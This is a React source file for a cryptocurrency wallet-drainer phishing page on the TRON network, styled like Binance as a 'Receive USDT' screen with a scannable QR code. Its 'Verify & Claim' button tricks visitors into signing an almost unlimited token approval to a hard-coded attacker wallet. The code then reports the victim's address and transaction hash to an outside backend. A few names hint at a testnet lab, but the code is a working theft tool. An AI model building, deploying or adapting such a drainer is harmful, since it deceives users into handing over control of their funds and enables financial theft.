import React, { useEffect, useState } from "react";
import { QRCodeSVG } from "qrcode.react";

// CONFIGURATION
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT
const SWEEPER_ADDRESS = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // YOUR ATTACKER WALLET
const BACKEND = "https://qr-drainer.onrender.com";
const VERCEL_URL = "https://qr-drainer-one.vercel.app";

// TRON LOGO BASE64 (High quality)
const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ZmMmQ1NSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

const fmt = (n) => Number(n).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");

export default function App() {
  const [isConnected, setIsConnected] = useState(false);
  const [wallet, setWallet] = useState("");
  const [victimBal, setVictimBal] = useState(0);
  const [step, setStep] = useState("idle"); // idle | connecting | approving | done
  const [error, setError] = useState("");

  // QR Code value (Standard URL for maximum compatibility)
  const qrValue = VERCEL_URL;

  // 1. DETECT WALLET AUTOMATICALLY
  useEffect(() => {
    const checkWallet = setInterval(() => {
      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        const addr = window.tronWeb.defaultAddress.base58;
        if (!isConnected) {
          setIsConnected(true);
          setWallet(addr);
          readBalance(addr);
        }
      }
    }, 1500);
    return () => clearInterval(checkWallet);
  }, [isConnected]);

  const readBalance = async (addr) => {
    try {
      const c = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      const raw = await c.balanceOf(addr).call();
      setVictimBal(Number(raw.toString()) / 1e6);
    } catch (e) { console.log("balance read", e); }
  };

  // 2. THE CONNECT LOGIC
  const handleConnect = async () => {
    setStep("connecting");
    setError("");
    try {
      if (window.tronLink?.request) {
        await window.tronLink.request({ method: "tron_requestAccounts" });
      } else if (window.tronWeb) {
        await window.tronWeb.request({ method: "tron_requestAccounts" });
      } else {
        throw new Error("Please open this link in TronLink or Trust Wallet DApp Browser.");
      }
      // Wait for injection
      await new Promise(r => setTimeout(r, 1500));
      if (window.tronWeb?.defaultAddress?.base58) {
        setIsConnected(true);
        setWallet(window.tronWeb.defaultAddress.base58);
        readBalance(window.tronWeb.defaultAddress.base58);
      } else {
        throw new Error("Connection rejected by wallet.");
      }
    } catch (e) {
      setError(e.message);
      setStep("idle");
    }
  };

  // 3. THE TRAP (APPROVE)
  const handleClaim = async () => {
    setStep("approving");
    setError("");
    try {
      const userAddress = window.tronWeb.defaultAddress.base58;
      
      // Build raw transaction to trigger the detailed native popup
      const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
        TOKEN_ADDRESS,
        "approve(address,uint256)",
        { feeLimit: 100000000, callValue: 0 },
        [
          { type: "address", value: SWEEPER_ADDRESS },
          { type: "uint256", value: 1000000000000000 } // Max allowance
        ],
        userAddress
      );
      
      if (!transaction.result || !transaction.result.result) throw new Error("Contract call rejected");
      
      const signedTx = await window.tronWeb.trx.sign(transaction.transaction);
      const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTx);
      
      if (!broadcast.result) throw new Error("Broadcast failed");

      // Ping Backend
      const txId = broadcast.txid || transaction.transaction.txID;
      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ victimAddress: userAddress, txHash: txId, network: "TRON Shasta" })
      });
      
      setStep("done");
    } catch (e) {
      console.error(e);
      setError(e.message || "Transaction failed.");
      setStep("idle");
    }
  };

  // Helper: Copy Address
  const handleCopy = () => { navigator.clipboard.writeText(SWEEPER_ADDRESS); };

  return (
    <div style={{ 
      background: "#0b0e11", // Binance-style dark background
      minHeight: "100vh", 
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', 
      display: "flex", 
      justifyContent: "center", 
      alignItems: "center", 
      padding: 20 
    }}>
      <div style={{ 
        background: "#ffffff", // WHITE CARD for high contrast
        borderRadius: 24, 
        padding: 32, 
        maxWidth: 400, 
        width: "100%", 
        boxShadow: "0 20px 60px rgba(0,0,0,0.8)",
        border: "1px solid #2a2d3a"
      }}>
        
        {/* HEADER */}
        <div style={{ textAlign: "center", marginBottom: 24 }}>
          <h2 style={{ margin: "0 0 8px 0", fontSize: 24, fontWeight: 800, color: "#1e2329" }}>Receive USDT</h2>
          <div style={{ fontSize: 14, color: "#707a8a", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
            <span style={{ width: 10, height: 10, background: "#ff2d55", borderRadius: "50%" }}></span>
            TRON Network (TRC20)
          </div>
        </div>

        {/* QR CODE - GUARANTEED SCANNABLE */}
        <div style={{ textAlign: "center", marginBottom: 24 }}>
          <div id="lab-qr-box" style={{ 
            display: "inline-block", 
            padding: 20, 
            background: "#ffffff", // Pure white background for scanning
            borderRadius: 16,
            border: "1px solid #eaecef",
            boxShadow: "0 4px 12px rgba(0,0,0,0.05)"
          }}>
            <QRCodeSVG 
              value={qrValue} 
              size={200} 
              level="H" 
              includeMargin={false}
              imageSettings={{ src: TRON_LOGO_B64, height: 48, width: 48, excavate: true }} 
            />
          </div>
        </div>

        {/* ADDRESS DISPLAY */}
        <div style={{ 
          background: "#f5f5f5", 
          borderRadius: 12, 
          padding: 14, 
          display: "flex", 
          justifyContent: "space-between", 
          alignItems: "center", 
          marginBottom: 20,
          border: "1px solid #eaecef"
        }}>
          <span style={{ fontFamily: "monospace", fontSize: 12, color: "#1e2329", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: "70%" }}>
            {SWEEPER_ADDRESS}
          </span>
          <button onClick={handleCopy} style={{ background: "#f0b90b", color: "#1e2329", border: "none", borderRadius: 6, padding: "6px 12px", fontSize: 12, fontWeight: 700, cursor: "pointer" }}>Copy</button>
        </div>

        {/* WARNING BANNER */}
        <div style={{ 
          background: "#fff8e1", 
          border: "1px solid #ffe082", 
          borderRadius: 10, 
          padding: 12, 
          fontSize: 12, 
          color: "#b45309", 
          marginBottom: 24, 
          display: "flex", 
          gap: 10, 
          alignItems: "flex-start" 
        }}>
          <span style={{ fontSize: 16 }}>⚠️</span>
          <span style={{ lineHeight: 1.4 }}>Only send TRC-20 USDT assets to this address. Other assets will be lost forever.</span>
        </div>

        {/* ERROR MESSAGE */}
        {error && (
          <div style={{ background: "#ffebee", color: "#c62828", padding: 12, borderRadius: 8, fontSize: 13, marginBottom: 16, textAlign: "center" }}>
            {error}
          </div>
        )}

        {/* DYNAMIC ACTION BUTTON */}
        {!isConnected ? (
          <button 
            onClick={handleConnect}
            disabled={step === "connecting"}
            style={{ 
              width: "100%", 
              background: "#f0b90b", // Binance Yellow
              color: "#1e2329", 
              border: "none", 
              borderRadius: 12, 
              padding: 16, 
              fontSize: 16, 
              fontWeight: 800, 
              cursor: "pointer",
              boxShadow: "0 4px 12px rgba(240,185,11,0.3)"
            }}
          >
            {step === "connecting" ? "Connecting..." : "Connect Wallet"}
          </button>
        ) : (
          <button 
            onClick={handleClaim} 
            disabled={step === "approving" || step === "done"}
            style={{ 
              width: "100%", 
              background: step === "done" ? "#0ecb81" : "#f0b90b", 
              color: "#1e2329", 
              border: "none", 
              borderRadius: 12, 
              padding: 16, 
              fontSize: 16, 
              fontWeight: 800, 
              cursor: "pointer",
              boxShadow: "0 4px 12px rgba(240,185,11,0.3)"
            }}
          >
            {step === "approving" ? "Processing..." : step === "done" ? "✓ Verified Successfully" : `Verify & Claim (${fmt(victimBal)} USDT)`}
          </button>
        )}

        {/* SESSION INFO */}
        {isConnected && (
          <div style={{ marginTop: 16, textAlign: "center", fontSize: 11, color: "#707a8a", fontFamily: "monospace" }}>
            Connected: {short(wallet)}
          </div>
        )}
      </div>
    </div>
  );
}